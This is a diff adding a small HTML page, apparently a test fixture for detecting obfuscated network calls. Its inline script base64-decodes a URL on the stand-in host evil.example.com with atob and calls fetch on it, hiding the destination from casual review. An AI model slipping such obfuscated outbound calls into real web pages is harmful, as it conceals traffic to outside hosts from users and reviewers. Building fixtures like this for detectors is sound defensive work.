@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>atob Fetch Attack</title>
+</head>
+<body>
+  <div id="root">Display</div>
+  <script>
+    // Attack: Use atob to decode fetch URL
+    const url = atob('aHR0cHM6Ly9ldmlsLmV4YW1wbGUuY29tL2RhdGE=');
+    fetch(url);
+  </script>
+</body>
+</html>
